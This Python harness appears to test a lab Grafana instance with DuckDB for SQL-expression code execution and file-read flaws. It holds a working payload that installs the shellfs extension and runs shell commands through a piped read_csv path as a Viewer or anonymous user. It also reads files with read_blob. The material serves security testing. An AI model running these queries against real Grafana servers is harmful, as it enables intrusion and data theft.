"""Independent genuine CLI/HTTP controls; runs only after a serial grant."""
import base64
import json
import os
from pathlib import Path
import re
import subprocess
import sys
import urllib.error
import urllib.request
import uuid
from runtime_context import RuntimeContext

ADMIN = ('module-lab-admin', 'module-target-grafana-admin-password')
VIEWER = ('module-lab-viewer', 'module-target-grafana-viewer-password')
PROOF = '/etc/grafana/module-target-proof.txt'
CLI = '/usr/local/bin/duckdb'


class Native(RuntimeContext):
    def __init__(self):
        self.runtime = json.loads(Path(os.environ['MODULE_TARGET_RUNTIME']).read_text())
        self.assets = json.loads(Path('test/module_targets/grafana_expression/assets.json').read_text())
        self.mode = os.environ.get('GRAFANA_EXPRESSION_PROFILE', 'affected')
        self.prefix = '/observability' if self.mode == 'anonymous' else ''
        endpoint = self.runtime['endpoints']['grafana']
        self.origin = f"http://{endpoint['host']}:{endpoint['port']}"
        self.artifacts = Path(self.runtime['artifacts'])
        self.commands = []
        self.requests = []
        self.pid_context = None
        self.api_context = None

    def command(self, *args, stdin=None, expected=0):
        argv = self.runtime['compose'] + ['exec', '-T', 'grafana', *args]
        result = subprocess.run(argv, input=stdin, capture_output=True, text=True, timeout=35)
        self.commands.append(dict(argv=argv, stdin=stdin, stdout=result.stdout,
                                  stderr=result.stderr, exitstatus=result.returncode))
        assert result.returncode == expected, self.commands[-1]
        return result.stdout

    def request(self, path, method='GET', data=None, account=ADMIN):
        headers = {'Accept': 'application/json'}
        if account is not None:
            headers['Authorization'] = 'Basic ' + base64.b64encode(':'.join(account).encode()).decode()
        raw = None if data is None else json.dumps(data).encode()
        if raw is not None:
            headers['Content-Type'] = 'application/json'
        url = self.origin + self.prefix + path
        request = urllib.request.Request(url, data=raw, headers=headers, method=method)
        record = dict(url=url, method=method, request=data, account=None if account is None else account[0],
                      status=None, headers={}, body=None)
        self.requests.append(record)
        try:
            try:
                response = urllib.request.urlopen(request, timeout=25)
            except urllib.error.HTTPError as error:
                response = error
            with response:
                record.update(status=response.code, headers=dict(response.headers))
                body = response.read().decode('utf-8')
                record['body'] = body
        except (urllib.error.URLError, TimeoutError, OSError) as error:
            record['transport_error'] = dict(type=type(error).__name__, message=str(error))
            raise
        try:
            document = json.loads(body)
        except json.JSONDecodeError:
            document = None
        return response.code, document

    @staticmethod
    def query(ref, sql):
        return dict(refId=ref, datasource=dict(type='__expr__', uid='__expr__', name='Expression'),
                    type='sql', expression=sql)

    def sql(self, queries, account=VIEWER):
        return self.request('/api/ds/query?ds_type=__expr__&expression=true&requestId=Q100',
                            method='POST', data=dict(queries=queries, **{'from': '1', 'to': '2'}), account=account)

    @staticmethod
    def value(document, ref='A'):
        return document['results'][ref]['frames'][0]['data']['values'][0][0]

    def cli(self, sql):
        return self.command(CLI, '', stdin='.mode json\n' + sql + '\n')

    def snapshot(self):
        users_status, users = self.request('/api/org/users')
        ds_status, sources = self.request('/api/datasources')
        dash_status, dashboards = self.request('/api/search?type=dash-db')
        assert (users_status, ds_status, dash_status) == (200, 200, 200)
        # Authentication timestamps are expected vendor state, not configuration.
        accounts = sorted([dict(id=user['userId'], login=user['login'], role=user['role'])
                           for user in users], key=lambda item: item['id'])
        cache = self.command('sh', '-c', 'if test -d "$HOME/.duckdb"; then find "$HOME/.duckdb" -type f -exec sha256sum {} + | sort; fi')
        return dict(accounts=accounts, datasources=sources, dashboards=dashboards, cache=cache)

    def owner_batch_control(self, selected):
        """Observe the copied algorithm; its success is not a setup oracle."""
        output = '/tmp/module-target-grafana-native-' + uuid.uuid4().hex
        marker = 'native-batch-' + uuid.uuid4().hex
        pipe = f"(printf '%s' '{marker}') > {output} 2>&1 |".replace("'", "''")
        queries = [self.query('A', f"SELECT 1; INSTALL shellfs FROM community; LOAD shellfs; SELECT * FROM read_csv('{pipe}', header=false)"),
                   self.query('B', f"SELECT content FROM read_blob('{output}')")]
        self.batch = dict(status=None, response=None, output=output, expected=marker,
                          algorithm_diagnostic=True, independent_api_rce_proof=False)
        try:
            status, document = self.sql(queries, account=selected)
            self.batch.update(status=status, response=document)
        except (urllib.error.URLError, TimeoutError, OSError) as error:
            self.batch['transport_error'] = dict(type=type(error).__name__, message=str(error))

        # Missing output is an observed algorithm outcome. Failed probing or
        # exact restoration still invalidates setup before Framework runs.
        probe = 'if test -L "$1"; then printf "symlink\\n"; elif test -f "$1"; then printf "present\\n"; stat -c %u "$1"; base64 -w 0 "$1"; elif test -e "$1"; then printf "other\\n"; else printf "absent\\n"; fi'
        try:
            observed = self.command('sh', '-c', probe, 'sh', output)
            lines = observed.split('\n', 2)
            state = lines[0]
            self.batch['marker'] = dict(state=state, matches=False)
            if state == 'present':
                contents = base64.b64decode(lines[2], validate=True)
                self.batch['marker'].update(uid=int(lines[1]), bytes_base64=lines[2],
                                            matches=contents == marker.encode() and int(lines[1]) == 472)
            assert state in ('present', 'absent'), self.batch
        finally:
            self.command('rm', '-f', output)
            self.command('sh', '-c', 'test ! -e "$1" && test ! -L "$1"', 'sh', output)
            self.batch['cleanup'] = 'Exact native-owned path absent'
        self.batch['independent_api_rce_proof'] = self.batch['marker']['matches']
        self.batch['independence_scope'] = 'Native API/host observation independent of Framework execution; not an independent original algorithm'
        self.batch['algorithm_source'] = 'Copied owning A/B batch; remains an algorithm diagnostic even when its marker succeeds'

    def preflight(self):
        identifiers = subprocess.check_output(self.runtime['compose'] + ['ps', '--quiet', 'grafana'], text=True, timeout=35).strip()
        inspected = subprocess.check_output(['docker', 'inspect', identifiers], text=True, timeout=35)
        container = json.loads(inspected)[0]
        images = json.loads(subprocess.check_output(['docker', 'image', 'inspect', container['Image']], text=True, timeout=35))
        assert images[0]['Architecture'] == 'amd64' and images[0]['Os'] == 'linux'
        registry = self.assets['grafana_registry'][self.assets['profile_registry'][self.mode]]
        vendor_layers = registry['vendor_rootfs_diff_ids']
        assert images[0]['RootFS']['Layers'][:len(vendor_layers)] == vendor_layers
        compose_labels = {'com.docker.compose.project', 'com.docker.compose.service', 'com.docker.compose.version'}
        labels = images[0]['Config']['Labels']
        assert {key: value for key, value in labels.items() if key not in compose_labels} == registry['vendor_config_labels']
        assert set(labels) - set(registry['vendor_config_labels']) <= compose_labels
        (self.artifacts / 'native-grafana-image.json').write_text(json.dumps(dict(container=container, image=images[0]), indent=2) + '\n')
        version_cli = self.command('grafana', 'server', '-v')
        status, health = self.request('/api/health', account=None)
        assert status == 200 and health['database'] == 'ok' and health['version'] == self.assets['expected_versions'][self.mode], health
        assert self.assets['expected_versions'][self.mode] in version_cli
        identity = self.command('id')
        assert self.command('id', '-u').strip() == '472'
        process_identity = self.command('cat', '/proc/1/status')
        assert re.search(r'^Uid:\s+472\s+472\s+472\s+472$', process_identity, re.M), process_identity
        machine = self.command('uname', '-m').strip()
        assert machine in ('x86_64', 'amd64'), machine
        environment = self.command('sh', '-c', 'printf "HOME=%s\\nPATH=%s\\n" "$HOME" "$PATH"; getent passwd 472')
        self.capture_process_context()
        self.command('bash', '--version')
        self.command('sh', '-c', 'command -v tee; command -v stat; command -v touch')
        binary = self.command('sh', '-c', 'command -v duckdb || true')
        actual_proof = self.command('cat', PROOF).encode()
        expected_proof = Path('test/module_targets/grafana_expression/proof.txt').read_bytes()
        assert actual_proof == expected_proof

        status, created = self.request('/api/admin/users', 'POST',
                                       dict(name='Module target Viewer', login=VIEWER[0],
                                            email='module-viewer@example.invalid', password=VIEWER[1]))
        assert status == 200 and isinstance(created.get('id'), int), created
        status, user = self.request('/api/user', account=VIEWER)
        assert status == 200 and user['login'] == VIEWER[0]
        state = self.snapshot()
        assert any(item['login'] == VIEWER[0] and item['role'] == 'Viewer' for item in state['accounts'])
        assert self.request('/api/user', account=(VIEWER[0], 'incorrect-password'))[0] == 401
        selected = None if self.mode == 'anonymous' else VIEWER
        self.serializer_control = None
        if self.mode == 'stock':
            assert not binary.strip()
            self.command('test', '!', '-e', CLI)
        else:
            assert binary.strip() == CLI, binary
            assert self.command('sha256sum', CLI).split()[0] == self.assets['binary_sha256']
            assert self.assets['version'] in self.cli('SELECT version();')
            platform = self.cli('PRAGMA platform;')
            assert json.loads(platform)[0]['platform'] in self.assets['cli_platform_candidates'], platform
            assert json.loads(self.cli("SELECT current_setting('allow_unsigned_extensions') AS allowed;"))[0]['allowed'] is False
            extension = self.assets['service_home'] + '/.duckdb/extensions/v1.1.2/linux_amd64_gcc4/shellfs.duckdb_extension'
            assert self.command('sha256sum', extension).split()[0] == self.assets['shellfs_binary_sha256']
            assert json.loads(self.cli('SELECT 42 AS module_target;'))[0]['module_target'] == 42
            assert json.loads(self.cli(f"SELECT hex(content) AS bytes FROM read_blob('{PROOF}');"))[0]['bytes'] == expected_proof.hex().upper()
            cli_identity = json.loads(self.cli("LOAD shellfs; SELECT * FROM read_csv('id -u |', header=false);"))
            assert str(next(iter(cli_identity[0].values()))) == '472', cli_identity

            # Match parser.go and go-duck v0.0.20 byte-for-byte, including the
            # spaces before newlines, empty database argv and absent semicolon.
            serializer_input = self.assets['serializer_control']['stdin']
            serializer_output = self.command(CLI, '', stdin=serializer_input)
            self.serializer_control = dict(stdin=serializer_input, stdout=serializer_output,
                                           scope=self.assets['serializer_control']['scope'])
            serialized_rows = json.loads(serializer_output)
            assert isinstance(serialized_rows, list) and len(serialized_rows) == 1, serialized_rows
            assert isinstance(serialized_rows[0], dict) and len(serialized_rows[0]) == 1, serialized_rows
            serialized_ast = next(iter(serialized_rows[0].values()))
            assert isinstance(serialized_ast, dict) and serialized_ast.get('error') is False, serialized_ast
            assert isinstance(serialized_ast.get('statements'), list) and len(serialized_ast['statements']) == 1, serialized_ast
            self.serializer_control['ast'] = serialized_ast

        status, scalar = self.sql([self.query('A', self.assets['serializer_control']['raw_sql'])], account=selected)
        if self.mode in ('stock', 'fixed'):
            assert status == 500 and scalar.get('message') == 'Query data error', scalar
        else:
            assert status == 200 and self.value(scalar) == 42, scalar

        status, blob = self.sql([self.query('A', f"SELECT hex(content) AS bytes FROM read_blob('{PROOF}')")], account=selected)
        if self.mode in ('stock', 'fixed'):
            assert status == 500 and blob.get('message') == 'Query data error', blob
        else:
            assert status == 200 and self.value(blob) == expected_proof.hex().upper(), blob

        if self.mode in ('affected', 'anonymous'):
            self.observe_api_context(selected)
        else:
            self.api_context = dict(scope='Genuine SQL refusal; no API engine/cache equivalence claim',
                                    scalar=scalar, file=blob)

        if self.mode != 'stock':
            self.owner_batch_control(selected)

        if self.mode != 'anonymous':
            assert self.sql([self.query('A', 'SELECT 42')], account=None)[0] == 401
        wrong_status, wrong_document = self.sql([self.query('A', 'SELECT 42')], account=(VIEWER[0], 'incorrect-password'))
        if self.mode == 'anonymous':
            # Reviewed Grafana 11.0.0/11.0.5 authn continues after Basic failure; the registered
            # anonymous client always tests true and supplies the configured
            # org role. /api/user excludes anonymous identities (checked above),
            # while /api/ds/query permits this Anonymous Viewer query.
            # https://github.com/grafana/grafana/blob/v11.0.0/pkg/services/anonymous/anonimpl/client.go
            assert wrong_status == 200 and self.value(wrong_document) == 42, wrong_document
            wrong_basic_policy = 'Anonymous Viewer SQL access; supplied Basic identity is not authenticated'
        else:
            assert wrong_status == 401, wrong_document
            wrong_basic_policy = 'Invalid Basic credentials refused'
        baseline = self.snapshot()
        assert baseline == state, dict(before=state, after=baseline)
        return dict(mode=self.mode, version=health['version'], health=health, cli=version_cli,
                    identity=identity, process_identity=process_identity, machine=machine, environment=environment,
                    selected_credentials=None if selected is None else list(VIEWER), prefix=self.prefix,
                    baseline=baseline, serializer_control=self.serializer_control, batch=getattr(self, 'batch', None),
                    actual_process_context=self.pid_context, readonly_api_context=self.api_context,
                    vendor_rootfs_prefix_layers=len(vendor_layers), vendor_config_labels_exact=True,
                    independent_api_rce_proof=bool(getattr(self, 'batch', {}).get('marker', {}).get('matches')),
                    wrong_basic_sql_policy=wrong_basic_policy)

    def read_file(self, path):
        assert re.fullmatch(r'/tmp/(?:[A-Za-z0-9]{16}|module-target-grafana-[A-Za-z0-9_-]+)', path), path
        return self.command('cat', path)


if __name__ == '__main__':
    native = Native()
    action = sys.argv[1]
    label = sys.argv[2]
    facts = None
    try:
        if action == 'preflight':
            facts = native.preflight()
        elif action == 'snapshot':
            facts = native.snapshot()
        elif action == 'read-file':
            facts = native.read_file(sys.argv[3])
        else:
            raise ValueError('Unknown native action')
        print(json.dumps(facts))
    finally:
        path = native.artifacts / f'native-grafana-{label}.json'
        path.write_text(json.dumps(dict(commands=native.commands, http=native.requests, facts=facts,
                                        serializer_control=getattr(native, 'serializer_control', None),
                                        owner_batch=getattr(native, 'batch', None),
                                        actual_process_context=native.pid_context,
                                        readonly_api_context=native.api_context), indent=2) + '\n')
